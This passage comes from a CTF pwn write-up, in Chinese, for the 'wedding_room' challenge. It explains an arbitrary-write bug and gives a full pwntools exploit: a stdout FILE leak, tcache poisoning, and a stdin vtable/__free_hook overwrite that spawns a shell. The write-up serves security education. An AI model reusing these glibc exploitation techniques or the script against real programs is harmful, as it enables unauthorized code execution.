class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">wedding$</span><span class="bash"> checksec wedding_room</span> </span><br><span class="line">[*] &#x27;/home/pwn/\xe6\xa1\x8c\xe9\x9d\xa2/tmp/wedding/wedding_room&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>漏洞点很明显，<code>preapare</code>没有对<code>v4</code>和<code>v5</code>做限制，可以造成任意地址修改为<code>0x135</code>或者<code>0x1314</code>。</p><p>由于<code>wishes</code> 必须小于等<code>2</code>，因此只能使用<code>preapare</code>三次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">preapare</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( wishes &gt; <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wishes are enough&quot;</span>);</span><br><span class="line">  &#125;    </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thanks !&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;and now wish them lifetime miss each other! 135 !&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    v5 = my_read();   <span class="comment">// v5 可控</span></span><br><span class="line">    <span class="built_in">memcpy</span>((heap[v2] + v5), &amp;unk_2172, <span class="number">2uLL</span>);</span><br><span class="line">    ++wishes;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW !! you are so fervent !!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;and now wish them love entire life !! 1314 !&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    v4 = my_read();   <span class="comment">// v4 可控</span></span><br><span class="line">    <span class="built_in">memcpy</span>((heap[v2] + v4), &amp;unk_2131, <span class="number">2uLL</span>);</span><br><span class="line">    ++wishes;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>revise</code>同样没有对<code>index</code>做限制，可以造成任意地址写<code>3/8</code>字节数据。</p><p><code>w1shes，wlshes</code>均在<code>bss</code>段，初始化为0， 因此这里的每个任意地址写<code>3/8 bytes</code>只能使用<code>1</code>次。</p><p>注意<code>wishes\ w1shes\wlshes</code>区分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">revise</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which packet you want to revise&gt;&gt; &quot;</span>);</span><br><span class="line">  index = my_read();    <span class="comment">// index 可控</span></span><br><span class="line">  <span class="keyword">if</span> ( w1shes &lt;= <span class="number">0</span> &amp;&amp; size[index] &gt; <span class="number">0x999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now write your wish&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, heap[index], <span class="number">8uLL</span>);</span><br><span class="line">    ++w1shes;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( wlshes &lt;= <span class="number">0</span> &amp;&amp; size[index] &lt;= <span class="number">0x999</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now write your wish&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, heap[index], <span class="number">3uLL</span>);</span><br><span class="line">    ++wlshes;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li>首先需要泄露地址，这里使用<code>_IO_2_1_stdout_</code>泄露<code>pie\libc\heap</code>三个基地址。</li><li>攻击<code>tcache_bins</code>，使很大的堆块也能被<code>tcache</code>管理，使用<code>tcache bin poisoning</code>修改<code>w1shes</code>为负数，可以<code>revise</code>多次</li><li>攻击<code>_IO_2_1_stdin_</code>，修改<code>__free_hook</code>为<code>system</code>或者<code>one_gadget</code></li></ol><p>第一步：</p><p>当我们申请堆块大小大于<code>128k</code>时，会使用<code>mmap</code>申请空间，所分配虚拟地址空间在<code>libc</code>上方相邻。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modify _flags</span></span><br><span class="line">prepare(<span class="number">0x40000</span>, off_first + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">1</span>)</span><br><span class="line"><span class="comment"># modify _IO_write_base</span></span><br><span class="line">prepare(<span class="number">0x40000</span>, off_first + <span class="number">0x41000</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure><p>这时，通过<code>prepare</code>分别去修改<code>_IO_2_1_stdout_</code>的<code>_flags</code>和<code>_IO_write_base</code>，其中<code>_IO_FILE_jumps</code>结构体中<code>_flags</code>的偏移为0，<code>_IO_write_base</code>偏移为<code>0x20</code>，利用原理可以<a href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237/article/details/113845320</a> 。</p><p>最后会执行<code>_IO_do_write (f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base)</code>，传入<code>_IO_do_write</code>函数的参数为：<code>stdout</code>结构体、<code>_IO_write_base</code>（输出缓冲区起始地址）和<code>size</code>（<code>_IO_write_end - _IO_write_base</code>计算得来），其中<code>_IO_write_base</code>的低<code>2</code>字节可以被覆盖为<code>0x1314</code>。所以会泄露很长一串数据，包括<code>pie\libc_base\heap_base</code>，（注意：这里接收数据很长，需要去找一些标志性的数据，再接收我们需要的地址。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(p64(<span class="number">0xfffffffffffffff8</span>),timeout=<span class="number">8</span>)</span><br><span class="line">pie = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x4040</span></span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>))- <span class="number">0x1f1210</span></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">lg(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">size = pie + <span class="number">0x000000000004060</span></span><br><span class="line">heap = pie + <span class="number">0x0000000000040a0</span></span><br><span class="line"><span class="keyword">assert</span> (libc_base&gt;&gt; <span class="number">40</span>) == <span class="number">0x7f</span> </span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffff78</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1c8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br></pre></td></tr></table></figure><p>第二步：</p><p>和上一步方法一样， 使用<code>prepare</code>申请大块，修改<code>tcache_bins</code>为<code>0x1314</code>。这时，当再调用<code>malloc</code>h或者<code>free</code>时，会首先调用<code>tcache_get()</code>,将小于<code>0x1314</code>的堆块加入到<code>tcache_entry</code>中。再利用<code>tcache bin poisoning</code>将堆分配到<code>$rebase(0x4048)</code> , 利用<code>0x4008</code>的跳板，将其修改为<code>w1shes</code>的地址，再利用<code>tcache_get()</code>中<code>e-&gt;key = NULL</code> ，刷新<code>w1shes</code>为0，这样就可以在执行两次<code>revise</code>, 再往跳板出写入负数，就可以修改<code>w1shes</code>为负数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">tcache_bins &#x3D; 0x00000000001EB2D0 # remote 0x00000000001EC2D0</span><br><span class="line">prepare(0x40000, off_first + 0x41000*2 + tcache_bins) # 2</span><br><span class="line"></span><br><span class="line">prepare(0xab0-0x290-0x20) # 3</span><br><span class="line">prepare(0x2000) # 4</span><br><span class="line"></span><br><span class="line">revise(4, p64(pie + 0x4048))</span><br><span class="line">revise(-19, p64(pie + 0x4055)[:3])</span><br><span class="line">prepare(0x1450) # 5</span><br><span class="line"></span><br><span class="line">revise(-19, p64(0xffeeee)[:3]) #</span><br><span class="line"># pwndbg&gt; x&#x2F;wx $rebase(0x4054)</span><br><span class="line"># 0x55a766084054 &lt;w1shes&gt;:0xffeeee01</span><br></pre></td></tr></table></figure><p>第三步：</p><p>将<code>stdin-&gt;vtable</code>修改为<code>_IO_str_jumps</code>；将<code>__free_hook</code>修改为<code>system</code>；将<code>stdin-&gt;flags</code>修改为<code>0x80</code>；将<code>stdin-&gt;_IO_buf_base</code>处修改为<code>/bin/sh</code>;最后把<code>bss</code>段上的<code>stdout</code>修改为<code>_IO_2_1_stdin_</code>。接着，在调用<code>puts(xxx)</code>的时候，会调用<code>stdin-&gt;vtable-&gt;_IO_file_xsput</code>，实际调用的是<code>_IO_str_finish</code>，接着调用<code>free(fp-&gt;_IO_buf_base)</code>，就是调用<code>system(&quot;/bin/sh&quot;)</code></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./wedding_room&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28957</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./wedding_room&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name, get_addr_name, mode=<span class="number">1</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line"><span class="keyword">return</span> addr-libc.sym[name]+libc.sym[get_addr_name]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr-libc.dump(name)+libc.dump(get_addr_name)</span><br><span class="line"><span class="comment"># def prepare(size, offset):</span></span><br><span class="line"><span class="comment"># sla(&#x27;your choice &gt;&gt; \n&#x27;, str(1))</span></span><br><span class="line"><span class="comment"># sla(&#x27;prepare&gt;&gt; \n&#x27;, str(size))</span></span><br><span class="line"><span class="comment"># sla(&#x27;&gt;&gt; &#x27;, str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def revise(idx,content):</span></span><br><span class="line"><span class="comment"># sla(&#x27;your choice &gt;&gt; \n&#x27;, str(2))</span></span><br><span class="line"><span class="comment"># sla(&quot;revise&gt;&gt; \n&quot;, str(idx))</span></span><br><span class="line"><span class="comment"># sla(&quot;wish&gt;&gt; \n&quot;, content)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare</span>(<span class="params">size, offset=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> size &gt; <span class="number">0x7fffffff</span>:</span><br><span class="line">        size -= (<span class="number">0x1</span> &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> offset <span class="keyword">and</span> offset &gt; <span class="number">0x7fffffff</span>:</span><br><span class="line">        offset -= (<span class="number">0x1</span> &lt;&lt; <span class="number">32</span>) </span><br><span class="line">    sla(<span class="string">&quot;your choice &gt;&gt; \n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">&quot;how much do you prepare&gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(size).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> offset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        sa(<span class="string">&quot;&gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(offset).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">revise</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice &gt;&gt; \n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;which packet you want to revise&gt;&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&quot;now write your wish&gt;&gt; \n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">off_first = <span class="number">0x41000</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify _flags</span></span><br><span class="line">prepare(<span class="number">0x40000</span>, off_first + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify _IO_write_base</span></span><br><span class="line">prepare(<span class="number">0x40000</span>, off_first + <span class="number">0x41000</span> + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.recvuntil(p64(0xffffffffffffffe8))</span></span><br><span class="line"><span class="comment"># p.recvuntil(p64(0xfffffffffffffff0))</span></span><br><span class="line">p.recvuntil(p64(<span class="number">0xfffffffffffffff8</span>),timeout=<span class="number">8</span>)</span><br><span class="line">pie = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x4040</span></span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>))- <span class="number">0x1f1210</span></span><br><span class="line"><span class="comment"># p.recv()</span></span><br><span class="line">lg(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">size = pie + <span class="number">0x000000000004060</span></span><br><span class="line">heap = pie + <span class="number">0x0000000000040a0</span></span><br><span class="line"><span class="keyword">assert</span> (libc_base&gt;&gt; <span class="number">40</span>) == <span class="number">0x7f</span> </span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffff78</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line">p.recvuntil(p64(<span class="number">0xffffffffffffffff</span>),timeout=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x1c8</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>, heap_base)</span><br><span class="line"></span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare(0x100, (pie+0x4038+1) - (heap_base+0x2a0) )</span></span><br><span class="line"><span class="comment"># # gdb.attach(p)</span></span><br><span class="line"><span class="comment"># revise(-10, p64(0xffffff00ffffff00))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># revise(-0x13, p64(pie+0x4050)[:3])</span></span><br><span class="line"><span class="comment"># prepare(0x100, pie+0x4015 - (heap_base+0x2a0))</span></span><br><span class="line"><span class="comment"># revise(-0x13, p32(0xff000000)*2)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">tcache_bins = <span class="number">0x00000000001EB2D0</span> <span class="comment"># remote 0x00000000001EC2D0</span></span><br><span class="line"></span><br><span class="line">prepare(<span class="number">0x40000</span>, off_first + <span class="number">0x41000</span>*<span class="number">2</span> + tcache_bins) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">prepare(<span class="number">0xab0</span>-<span class="number">0x290</span>-<span class="number">0x20</span>) <span class="comment"># 3</span></span><br><span class="line">prepare(<span class="number">0x2000</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">revise(<span class="number">4</span>, p64(pie + <span class="number">0x4048</span>))</span><br><span class="line">revise(-<span class="number">19</span>, p64(pie + <span class="number">0x4055</span>)[:<span class="number">3</span>])</span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">revise(-<span class="number">19</span>, p64(<span class="number">0xffeeee</span>)[:<span class="number">3</span>]) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pwndbg&gt; x &amp;_IO_str_jumps </span></span><br><span class="line"><span class="comment"># 0x7f69ce114560 &lt;_IO_str_jumps&gt;:0x0000000000000000</span></span><br><span class="line"><span class="comment"># pwndbg&gt; x 0x7f69ce114560-0x7f69cdf27000</span></span><br><span class="line"><span class="comment"># 0x1ed560:Cannot access memory at address 0x1ed560</span></span><br><span class="line"></span><br><span class="line">str_jumps_off = <span class="number">0x1ed560</span></span><br><span class="line">revise(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">216</span>)) <span class="comment"># stdin-&gt;vtable  p *(struct _IO_FILE_plus *)(0x00007ffb1d8c4a58-216)</span></span><br><span class="line"></span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 6</span></span><br><span class="line">revise(<span class="number">6</span>, p64(libc_base + str_jumps_off - <span class="number">0x28</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">revise(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])) <span class="comment"># __free_hook</span></span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 7</span></span><br><span class="line">revise(<span class="number">7</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">revise(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])) <span class="comment"># stdin-&gt;flags</span></span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 0</span></span><br><span class="line">revise(<span class="number">0</span>, p64(<span class="number">0x80</span>))</span><br><span class="line"></span><br><span class="line">revise(<span class="number">4</span>, p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>] + <span class="number">56</span>)) <span class="comment"># stdin-&gt;_IO_buf_base</span></span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 0</span></span><br><span class="line">revise(<span class="number">0</span>, p64(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line">revise(<span class="number">4</span>, p64(pie + <span class="number">0x4020</span>)) <span class="comment"># stdout</span></span><br><span class="line">prepare(<span class="number">0x1450</span>) <span class="comment"># 0</span></span><br><span class="line">revise(<span class="number">0</span>, p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta">$</span><span class="bash"> id</span></span><br><span class="line">uid=1000(pwn) gid=1000(pwn) 组=1000(pwn),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(lxd),132(sambashare)</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">core  libc  libc.so.6  ltmain.sh  wedding_room    wedding_solve.py</span><br><span class="line"><span class="meta">$</span><span class="bash"> </span> </span><br></pre></td></tr></table></figure><p>参考</p><p><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a></p><p><a href="https://blog.csdn.net/abel_big_xu/article/details/111145399">https://blog.csdn.net/abel_big_xu/article/details/111145399</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">https://blog.csdn.net/qq_41202237/article/details/113845320</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/16070118.html#wedding-again-again">https://www.cnblogs.com/LynneHuan/p/16070118.html#wedding-again-again</a></p>]]></content>
    
    
    <summary type="html">2022DASCTF X SU 三月春季挑战赛</summary>
    
    
    
    <category term="CTF" scheme="https://adam-01.github.io/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://adam-01.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯2021-PWN</title>
    <link href="https://adam-01.github.io/2021/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2021-pwn/"/>
    <id>https://adam-01.github.io/2021/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2021-pwn/</id>
    <published>2021-11-30T05:39:06.000Z</published>
    <updated>2022-01-04T16:45:25.213Z</updated>
    
